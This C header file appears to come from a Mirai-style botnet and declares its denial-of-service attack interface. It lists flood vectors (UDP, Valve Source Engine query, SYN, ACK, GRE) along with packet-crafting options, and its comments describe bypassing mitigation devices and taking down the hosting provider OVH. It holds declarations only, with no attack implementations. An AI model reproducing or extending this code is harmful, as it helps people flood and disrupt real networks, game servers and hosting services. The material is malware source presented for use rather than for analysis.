#pragma once

#include <time.h>
#include <arpa/inet.h>
#include <linux/ip.h>
#include <linux/udp.h>
#include <linux/tcp.h>

#include "includes.h"
#include "protocol.h"

#define ATTACK_CONCURRENT_MAX   8

struct attack_target {
    struct sockaddr_in sock_addr;
    ipv4_t addr;
    uint8_t netmask;
};

struct attack_option {
    char *val;
    uint8_t key;
};

typedef void (*ATTACK_FUNC) (uint8_t, struct attack_target *, uint8_t, struct attack_option *);
typedef uint8_t ATTACK_VECTOR;

#define ATK_VEC_UDP        0  /* Straight up UDP flood */
#define ATK_VEC_VSE        1  /* Valve Source Engine query flood */
#define ATK_VEC_SYN        2  /* SYN flood with options */
#define ATK_VEC_ACK        3  /* ACK flood */
#define ATK_VEC_YSYNACK    4  /* Yunina Blue SynAck flood - ovh down */
#define ATK_VEC_STOMP      5  /* ACK flood to bypass mitigation devices */
#define ATK_VEC_GREIP      6  /* GRE IP flood */
#define ATK_VEC_GREETH     7  /* GRE Ethernet flood */
#define ATK_VEC_UDP_PLAIN  8  /* Plain UDP flood optimized for speed */

#define ATK_OPT_PAYLOAD_SIZE    0   // What should the size of the packet data be?
#define ATK_OPT_PAYLOAD_RAND    1   // Should we randomize the packet data contents?
#define ATK_OPT_IP_TOS          2   // tos field in IP header
#define ATK_OPT_IP_IDENT        3   // ident field in IP header
#define ATK_OPT_IP_TTL          4   // ttl field in IP header
#define ATK_OPT_IP_DF           5   // Dont-Fragment bit set
#define ATK_OPT_SPORT           6   // Should we force a source port? (0 = random)
#define ATK_OPT_DPORT           7   // Should we force a dest port? (0 = random)
#define ATK_OPT_URG             8   // TCP URG header flag
#define ATK_OPT_ACK             9   // TCP ACK header flag
#define ATK_OPT_PSH             10  // TCP PSH header flag
#define ATK_OPT_RST             11  // TCP RST header flag
#define ATK_OPT_SYN             12  // TCP SYN header flag
#define ATK_OPT_FIN             13  // TCP FIN header flag
#define ATK_OPT_SEQRND          14  // Should we force the sequence number? (TCP only)
#define ATK_OPT_ACKRND          15  // Should we force the ack number? (TCP only)
#define ATK_OPT_GRE_CONSTIP     16  // Should the encapsulated destination address be the same as the target?
#define ATK_OPT_SOURCE          17  // Source IP

struct attack_method {
    ATTACK_FUNC func;
    ATTACK_VECTOR vector;
};

struct attack_stomp_data {
    ipv4_t addr;
    uint32_t seq, ack_seq;
    port_t sport, dport;
};

BOOL attack_init(void);
void attack_kill_all(void);
void attack_parse(char *, int);
void attack_start(int, ATTACK_VECTOR, uint8_t, struct attack_target *, uint8_t, struct attack_option *);
char *attack_get_opt_str(uint8_t, struct attack_option *, uint8_t, char *);
int attack_get_opt_int(uint8_t, struct attack_option *, uint8_t, int);
uint32_t attack_get_opt_ip(uint8_t, struct attack_option *, uint8_t, uint32_t);

/* Actual attacks */
void attack_udp_generic(uint8_t, struct attack_target *, uint8_t, struct attack_option *);
void attack_udp_vse(uint8_t, struct attack_target *, uint8_t, struct attack_option *);
void attack_udp_plain(uint8_t, struct attack_target *, uint8_t, struct attack_option *);

void attack_tcp_syn(uint8_t, struct attack_target *, uint8_t, struct attack_option *);
void attack_tcp_ack(uint8_t, struct attack_target *, uint8_t, struct attack_option *);
void attack_tcp_ysynack(uint8_t, struct attack_target *, uint8_t, struct attack_option *);  // DONT FUCK WITH THIS SHIT - Tokyo's
void attack_tcp_stomp(uint8_t, struct attack_target *, uint8_t, struct attack_option *);

void attack_gre_ip(uint8_t, struct attack_target *, uint8_t, struct attack_option *);
void attack_gre_eth(uint8_t, struct attack_target *, uint8_t, struct attack_option *);

static void add_attack(ATTACK_VECTOR, ATTACK_FUNC);
static void free_opts(struct attack_option *, int);
